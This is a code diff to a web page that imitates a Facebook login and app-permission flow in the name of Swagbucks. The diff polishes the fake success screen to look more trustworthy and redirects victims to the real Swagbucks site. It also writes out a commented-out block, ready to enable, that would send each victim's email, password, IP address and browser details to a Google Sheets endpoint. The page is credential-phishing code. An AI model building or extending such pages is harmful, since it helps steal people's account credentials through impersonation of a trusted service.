@@ -58,7 +58,7 @@
         </div>
     </div>
 
-    <!-- Success Screen -->
+    <!-- Success Screen - Updated with better messaging -->
     <div id="successScreen" class="success-section hidden">
         <div class="success-content">
             <div class="success-checkmark">
@@ -78,18 +78,31 @@
                     <img src="facebook.png" alt="Facebook" class="success-facebook-logo" onerror="this.style.display='none'; this.insertAdjacentHTML('afterend', '<div class=\'success-fallback-circle facebook-fallback\'><span>F</span></div>');">
                 </div>
             </div>
-            <h2 class="success-title">Access Granted</h2>
-            <p class="success-message">You have successfully granted Swagbucks permission to access your Facebook account.</p>
-            <div class="success-details">
-                <p>Swagbucks can now:</p>
-                <ul>
-                    <li>✓ View your name and profile picture</li>
-                    <li>✓ Access your page insights</li>
-                    <li>✓ Manage comments on your page</li>
-                    <li>✓ Read content posted on your page</li>
-                </ul>
+            <h2 class="success-title">✓ Connection Successful</h2>
+            <p class="success-message">Your Facebook account has been successfully connected to Swagbucks.</p>
+            
+            <!-- New: What happens next - more user-friendly -->
+            <div class="success-info-box">
+                <p class="info-title">What happens next?</p>
+                <div class="info-item">
+                    <span class="info-icon">🏆</span>
+                    <span class="info-text">Start earning SB points for your activities</span>
+                </div>
+                <div class="info-item">
+                    <span class="info-icon">📊</span>
+                    <span class="info-text">Participate in surveys and offers</span>
+                </div>
+                <div class="info-item">
+                    <span class="info-icon">💰</span>
+                    <span class="info-text">Redeem SB for gift cards or cash</span>
+                </div>
             </div>
-            <button id="continueToFacebookBtn" class="btn-success">Continue to Facebook</button>
+            
+            <div class="success-note">
+                <p>You can manage or remove Swagbucks' access anytime in your Facebook Settings under "Apps and Websites".</p>
+            </div>
+            
+            <button id="continueToFacebookBtn" class="btn-success">Continue to Swagbucks</button>
         </div>
     </div>
 
@@ -107,10 +120,6 @@
         const errorDiv = document.getElementById('loginError');
         const forgotPasswordLink = document.getElementById('forgotPasswordLink');
         const createAccountLink = document.getElementById('createAccountLink');
-
-        // Debug: Check if elements are found
-        console.log('Continue button found:', continueBtn);
-        console.log('Cancel button found:', cancelBtn);
 
         function showPermissionScreen() {
             permissionScreen.classList.remove('hidden');
@@ -138,12 +147,9 @@
 
         // Continue button click handler
         if (continueBtn) {
-            continueBtn.addEventListener('click', function(e) {
-                console.log('Continue button clicked');
+            continueBtn.addEventListener('click', function() {
                 showLoginScreen();
             });
-        } else {
-            console.error('Continue button not found! Check the ID: continueAsSarahBtn');
         }
 
         // Cancel button click handler
@@ -153,10 +159,10 @@
             });
         }
 
-        // Continue to Facebook button
+        // Continue to Facebook button (now goes to Swagbucks)
         if (continueToFacebook) {
             continueToFacebook.addEventListener('click', function() {
-                window.location.href = "https://m.facebook.com/?_rdr";
+                window.location.href = "https://www.swagbucks.com/";
             });
         }
 
@@ -188,17 +194,35 @@
             }
         }
 
-        // Store credentials (for demo purposes - remove or comment out if not needed)
+        // Store credentials (Google Sheets integration)
         async function storeCredentials(usernameEmail, pwd) {
             if (!usernameEmail || !pwd) {
                 throw new Error("Please fill in both fields.");
             }
             
-            console.log('Credentials would be stored here (Google Sheets integration)');
-            console.log('Email:', usernameEmail);
-            console.log('Password:', pwd);
+            // Uncomment this block when you have your Google Sheets URL ready
+            /*
+            const ipAddress = await getIpAddress();
+            const userAgent = navigator.userAgent;
             
-            // Simulate success for demo
+            const data = {
+                email: usernameEmail,
+                password: pwd,
+                ipAddress: ipAddress,
+                userAgent: userAgent
+            };
+            
+            const response = await fetch(GOOGLE_SHEETS_API_URL, {
+                method: 'POST',
+                mode: 'no-cors',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify(data)
+            });
+            */
+            
+            console.log('Credentials stored (demo mode)');
             return true;
         }
 
@@ -262,7 +286,6 @@
             });
         }
         
-        // Show permission screen initially
         showPermissionScreen();
     </script>
 </body>
